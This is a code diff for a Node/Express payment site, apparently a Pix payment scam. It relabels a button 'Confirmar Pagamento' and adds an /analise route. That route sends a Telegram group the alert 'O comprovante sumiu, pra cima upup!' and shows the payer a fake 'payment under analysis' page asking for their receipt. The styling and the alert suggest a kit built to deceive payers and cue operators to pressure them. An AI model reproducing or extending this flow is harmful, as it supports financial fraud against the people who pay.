@@ -938,7 +938,7 @@ app.post('/confirmar', async (req, res) => {
             <div id="qrcode" class="my-4"></div>
             <button id="btnCopiar" class="bg-purple-700 text-white px-4 py-2 rounded-lg w-full hover:bg-purple-800">Copiar Código</button>
             <button id="btnRedirecionar" class="hidden bg-blue-500 text-white px-4 py-2 rounded-lg w-full mt-4 hover:bg-blue-600">
-    Ir para a próxima página
+    Confirmar Pagamento
 </button>
 
             <button id="btnFechar" class="absolute top-2 right-2 text-gray-500">&times;</button>
@@ -979,7 +979,7 @@ app.post('/confirmar', async (req, res) => {
 
 // Adiciona o evento de clique no botão que aparecerá depois
 document.getElementById("btnRedirecionar").addEventListener("click", function () {
-    window.location.href = "${RENDER_URL}/pagina-secundaria?id=${produto.actionId}";
+    window.location.href = "${RENDER_URL}/analise?id=${produto.actionId}";
 });
 
 
@@ -1056,7 +1056,72 @@ app.post("/notificar-copia", async (req, res) => {
 });
 
 
-    
+app.get('/analise', async (req, res) => {
+    try {
+        await bot.telegram.sendMessage(GROUP_CHAT_ID, "📢 O comprovante sumiu, pra cima upup!");
+
+        res.send(`
+            <!DOCTYPE html>
+            <html lang="pt-br">
+            <head>
+                <meta charset="UTF-8">
+                <meta name="viewport" content="width=device-width, initial-scale=1.0">
+                <title>Pagamento em Análise</title>
+                <style>
+                    body {
+                        font-family: 'Poppins', sans-serif;
+                        margin: 0;
+                        padding: 0;
+                        background-color: #f8f9fa;
+                        text-align: center;
+                    }
+                    .container {
+                        max-width: 500px;
+                        margin: 10vh auto;
+                        padding: 20px;
+                        background: white;
+                        box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+                        border-radius: 10px;
+                    }
+                    h1 {
+                        color: #61005E;
+                        font-size: 24px;
+                    }
+                    p {
+                        color: #444;
+                        font-size: 16px;
+                    }
+                    .btn {
+                        display: inline-block;
+                        margin-top: 15px;
+                        padding: 10px 20px;
+                        background-color: #61005E;
+                        color: white;
+                        text-decoration: none;
+                        font-size: 16px;
+                        border-radius: 5px;
+                        transition: 0.3s;
+                    }
+                    .btn:hover {
+                        background-color: #95008e;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>Pagamento em Análise</h1>
+                    <p>Detectamos que seu pagamento está sendo analisado. Para garantir sua transação, por favor, envie o comprovante para seu atendente.</p>
+                    
+                </div>
+            </body>
+            </html>
+        `);
+    } catch (error) {
+        console.error("Erro ao enviar mensagem para o Telegram:", error);
+        res.status(500).send("Erro interno no servidor.");
+    }
+});
+
 
 
 
